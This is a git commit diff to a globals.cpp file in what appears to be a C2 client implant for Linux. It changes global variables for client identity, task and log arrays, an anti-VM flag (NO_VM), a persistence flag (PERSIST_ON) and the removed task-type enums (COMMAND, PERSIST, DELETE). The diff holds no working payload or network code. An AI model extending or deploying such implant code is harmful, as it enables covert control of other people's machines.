3dc5bf6eabaa33ed74bd73217ce65ed8d21d3711
jkingsec <119653318+jkingsec@users.noreply.github.com>
2023-12-23 18:05:30 -0700

    Update globals.cpp

--- src/server/clients/linux/ziti/src/globals.cpp
+++ src/server/clients/linux/ziti/src/globals.cpp
@@ -23,28 +23,24 @@ std::string client_id = "00000000-0000-0000-0000-000000000000";//replace with ge
 int project_id = 1;//replace
 //expiration date
 std::string expiration_date = "11-11-2111"; //replace
-//os name
-std::string os_name;
-//user name
-std::string user_name;
-//hostname
-std::string host_name;
-//client name
-std::string client_name;
-//UID
-int client_UID;
 //task array
-json task_array;
+json task_array = json::array();
 //log array
 json log_array = json::array();
-//log output
-std::string log_output;
 //settings
 bool NO_VM = true;
 bool PERSIST_ON = false;//for testing purposes
-//enums
-enum TASK_STATUS { NOTASK, TASK, CONNERROR };
-enum TASK_TYPE {COMMAND, CONFIG, PERSIST, PING, SHUTDOWN, DELETE};
-enum RES_STATUS { RES_SUCCESS, RES_FAIL };
 //connection bool
 bool CONN_OK = false;
+
+//placeholders
+//os name
+std::string os_name = "";
+//user name
+std::string user_name = "";
+//hostname
+std::string host_name = "";
+//client name
+std::string client_name = "";
+//UID
+int client_UID = 1000;
